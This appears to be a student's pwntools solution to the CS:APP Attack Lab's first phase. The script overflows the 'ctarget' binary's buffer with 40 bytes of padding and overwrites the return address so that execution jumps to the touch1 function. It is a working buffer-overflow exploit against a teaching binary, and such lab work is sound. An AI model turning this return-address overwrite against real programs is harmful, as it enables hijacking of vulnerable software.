# import subprocess
from pwn import p64, context, process

context(arch='amd64', os='linux')

p = process(['./ctarget', '-q'])

def touch1():
    offset = 40
    touch1_addr = 0x4017c0
    payload = b'a' * offset + p64(touch1_addr) + b'\n'

    p.sendline(payload)
    # p = subprocess.Popen(
        # ['orb', './ctarget', '-q'],
        # stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    # )
    # stdout, stderr = p.communicate(payload, timeout=10)
    # print(stdout.decode())


def main():
    touch1()


if __name__ == '__main__':
    main()
